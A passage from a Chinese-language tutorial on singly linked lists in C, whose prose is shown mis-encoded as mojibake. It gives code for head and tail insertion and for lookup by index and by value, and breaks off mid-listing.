ä¸€ä¸ªç»“ç‚¹ï¼Œæˆä¸ºå¤´ç»“ç‚¹ã€‚å¤´ç»“ç‚¹çš„æ•°æ®åŸŸå¯ä»¥ä¸è®¾ä»»ä½•ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥è®°å½•è¡¨é•¿ç­‰ä¿¡æ¯ã€‚å¤´ç»“ç‚¹çš„æŒ‡é’ˆåŸŸæŒ‡å‘çº¿æ€§è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ç»“ç‚¹ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/b0105c322a31496e97a856a9a5b7948c.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¤´ç»“ç‚¹å’Œå¤´æŒ‡é’ˆçš„åŒºåˆ†ï¼šä¸ç®¡å¸¦ä¸å¸¦å¤´ç»“ç‚¹ï¼Œå¤´æŒ‡é’ˆéƒ½å§‹ç»ˆæŒ‡å‘é“¾è¡¨çš„ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œè€Œå¤´ç»“ç‚¹æ—¶å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œç»“ç‚¹å†…é€šå¸¸ä¸å­˜å‚¨ä¿¡æ¯ã€‚</p><p>â€‹å¼•å…¥å¤´ç»“ç‚¹åï¼Œå¯ä»¥å¸¦æ¥ä¸¤ä¸ªä¼˜ç‚¹ã€‚</p><ol><li>ç”±äºç¬¬ä¸€ä¸ªæ•°æ®ç»“ç‚¹çš„ä½ç½®è¢«å­˜æ”¾åœ¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆåŸŸä¸­ï¼Œå› æ­¤åœ¨é“¾è¡¨çš„ç¬¬ä¸€ä¸ªä½ç½®ä¸Šçš„æ“ä½œå’Œåœ¨è¡¨çš„å…¶ä»–ä½ç½®ä¸Šçš„æ“ä½œä¸€è‡´ï¼Œæ— éœ€è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚</li><li>æ— è®ºé“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼Œå…¶å¤´æŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘å¤´ç»“ç‚¹çš„éç©ºæŒ‡é’ˆï¼ˆç©ºè¡¨ä¸­å¤´ç»“ç‚¹çš„æŒ‡é’ˆåŸŸä¸ºç©ºï¼‰ï¼Œå› æ­¤ç©ºè¡¨å’Œéç©ºè¡¨çš„å¤„ç†ä¹Ÿå°±å¾—åˆ°äº†ç»Ÿä¸€ã€‚</li></ol><h2 id="232-å•é“¾è¡¨ä¸ŠåŸºæœ¬æ“ä½œå’Œå®ç°"><a class="markdownIt-Anchor" href="#232-å•é“¾è¡¨ä¸ŠåŸºæœ¬æ“ä½œå’Œå®ç°">#</a> 2.3.2ã€å•é“¾è¡¨ä¸ŠåŸºæœ¬æ“ä½œå’Œå®ç°ï¼š</h2><h3 id="1-é‡‡ç”¨å¤´æ’æ³•å»ºç«‹å•é“¾è¡¨"><a class="markdownIt-Anchor" href="#1-é‡‡ç”¨å¤´æ’æ³•å»ºç«‹å•é“¾è¡¨">#</a> 1ã€é‡‡ç”¨å¤´æ’æ³•å»ºç«‹å•é“¾è¡¨ï¼š</h3><p>â€‹è¯¥æ–¹æ³•ä»ä¸€ä¸ªç©ºè¡¨å¼€å§‹ï¼Œç”Ÿæˆæ–°èŠ‚ç‚¹ï¼Œå¹¶å°†è¯»å–åˆ°çš„æ•°æ®å­˜æ”¾åˆ°ä¿¡ç»“ç‚¹çš„æ•°æ®åŸŸä¸­ï¼Œç„¶åå°†æ–°ç»“ç‚¹æ’å…¥åˆ°å½“å‰é“¾è¡¨çš„è¡¨å¤´ï¼Œå³å¤´ç»“ç‚¹ä¹‹åï¼Œå¦‚ä¸‹å›¾:</p><p><img data-src="https://img-blog.csdnimg.cn/direct/a25e2c3a10d9431daacfaf9ee4d71e5f.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¤´æ’æ³•å»ºç«‹å•é“¾è¡¨çš„ç®—æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L,p;</span><br><span class="line"></span><br><span class="line">    L = List_HeadInsert(L);</span><br><span class="line"></span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°å¤´æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°ï¼Œè¾“å‡ºç»“æœæ˜¯è¾“å…¥çš„é€†åºï¼Œè¾“å…¥1 2 3ï¼Œè¾“å‡ºç»“æœæ˜¯3ï¼Œ2ï¼Œ1</span></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    LNode *s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x!=<span class="number">9999</span>) &#123;</span><br><span class="line">        s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é‡‡ç”¨å¤´æ’æ³•å»ºç«‹å•é“¾è¡¨æ—¶ï¼Œè¯»å…¥æ•°æ®çš„é¡ºåºä¸ç”Ÿæˆçš„é“¾è¡¨çš„å…ƒç´ çš„é¡ºåºæ—¶ç›¸åçš„ã€‚æ¯ä¸ªç»“ç‚¹æ’å…¥çš„æ—¶é—´ä¸º O (1)ï¼Œè®¾å•é“¾è¡¨é•¿ä¸º n ï¼Œåˆ™æ€»æ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><h3 id="2-é‡‡ç”¨å°¾æ’æ³•å»ºç«‹å•é“¾è¡¨"><a class="markdownIt-Anchor" href="#2-é‡‡ç”¨å°¾æ’æ³•å»ºç«‹å•é“¾è¡¨">#</a> 2ã€é‡‡ç”¨å°¾æ’æ³•å»ºç«‹å•é“¾è¡¨ï¼š</h3><p>â€‹å¤´æ’æ³•å»ºç«‹å•é“¾è¡¨çš„ç®—æ³•è™½ç„¶ç®€å•ï¼Œä½†ç”Ÿæˆçš„é“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ¬¡åºå’Œè¾“å…¥æ•°æ®çš„é¡ºåºä¸ä¸€è‡´ã€‚è‹¥å¸Œæœ›ä¸¤è€…æ¬¡åºä¸€è‡´ï¼Œåˆ™å¯é‡‡ç”¨å°¾æ’æ³•ã€‚è¯¥æ–¹æ³•å°†æ–°ç»“ç‚¹æ’å…¥åˆ°å½“å‰é“¾è¡¨çš„è¡¨å°¾ï¼Œä¸ºæ­¤å¿…é¡»å¢åŠ ä¸€ä¸ªå°¾æŒ‡é’ˆ r ï¼Œä½¿å…¶å§‹ç»ˆæŒ‡å‘å½“å‰é“¾è¡¨çš„å°¾ç»“ç‚¹ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/06737140c95d476aa7ddd2ef215b7229.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L,p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¤´æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line"><span class="comment">//    L = List_HeadInsert(L);</span></span><br><span class="line">    <span class="comment">//å°¾æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line">    L = List_TailInsert(L);</span><br><span class="line"></span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    LNode *s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x!=<span class="number">9999</span>) &#123;</span><br><span class="line">        s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°å°¾æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°</span></span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    LinkList s,r = L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">9999</span>)&#123;</span><br><span class="line">        s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-æŒ‰åºå·æŸ¥æ‰¾ç»“ç‚¹"><a class="markdownIt-Anchor" href="#3-æŒ‰åºå·æŸ¥æ‰¾ç»“ç‚¹">#</a> 3ã€æŒ‰åºå·æŸ¥æ‰¾ç»“ç‚¹ï¼š</h3><p>â€‹åœ¨å•é“¾è¡¨ä¸­ä»ç¬¬ä¸€ä¸ªç»“ç‚¹å‡ºå‘ï¼Œé¡ºæ—¶é’ˆ next åŸŸé€ä¸ªå¾€ä¸‹æœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ i ä¸ªç»“ç‚¹ä¸ºæ­¢ï¼Œå¦åˆ™è¿”å›æœ€åä¸€ä¸ªç»“ç‚¹æŒ‡é’ˆåŸŸ NULLã€‚</p><p>â€‹æŒ‰åºå·æŸ¥æ‰¾ç»“ç‚¹å€¼çš„ç®—æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L,p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¤´æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line"><span class="comment">//    L = List_HeadInsert(L);</span></span><br><span class="line">    <span class="comment">//å°¾æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line">    L = List_TailInsert(L);</span><br><span class="line"></span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkList target =  GetElem(L,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,target-&gt;data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    LNode *s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x!=<span class="number">9999</span>) &#123;</span><br><span class="line">        s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    LinkList s,r = L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">9999</span>)&#123;</span><br><span class="line">        s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°æŒ‰åºå·æŸ¥æ‰¾ç»“ç‚¹ç®—æ³•çš„å‡½æ•°</span></span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; j &lt; i)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æŒ‰åºå·æŸ¥æ‰¾æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸º O (n)ã€‚</p><h3 id="4-æŒ‰å€¼æŸ¥æ‰¾è¡¨ç»“ç‚¹"><a class="markdownIt-Anchor" href="#4-æŒ‰å€¼æŸ¥æ‰¾è¡¨ç»“ç‚¹">#</a> 4ã€æŒ‰å€¼æŸ¥æ‰¾è¡¨ç»“ç‚¹ï¼š</h3><p>â€‹ä»å•é“¾è¡¨çš„ç¬¬ä¸€ä¸ªç»“ç‚¹å¼€å§‹ï¼Œç”±å‰å¾€åä¾æ¬¡æ¯”è¾ƒè¡¨ä¸­å„ç»“ç‚¹æ•°æ®åŸŸçš„å€¼ï¼Œè‹¥æŸç»“ç‚¹æ•°æ®åŸŸçš„å€¼ç­‰äºç»™å®šå€¼ e ï¼Œåˆ™è¿”å›è¯¥ç»“ç‚¹çš„æŒ‡é’ˆï¼›è‹¥æ•´ä¸ªå•é“¾è¡¨ä¸­æ²¡æœ‰è¿™æ ·çš„ç»“ç‚¹ï¼Œåˆ™è¿”å› NULLã€‚</p><p>â€‹æŒ‰å€¼æŸ¥æ‰¾è¡¨ç»“ç‚¹çš„ç®—æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>;</span><br><span class="line">LinkList <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L,p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¤´æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line"><span class="comment">//    L = List_HeadInsert(L);</span></span><br><span class="line">    <span class="comment">//å°¾æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line">    L = List_TailInsert(L);</span><br><span class="line"></span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkList target =  GetElem(L,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,target-&gt;data);</span><br><span class="line"></span><br><span class="line">    target = LocateElem(L,<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,target-&gt;data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    LNode *s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x!=<span class="number">9999</span>) &#123;</span><br><span class="line">        s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span 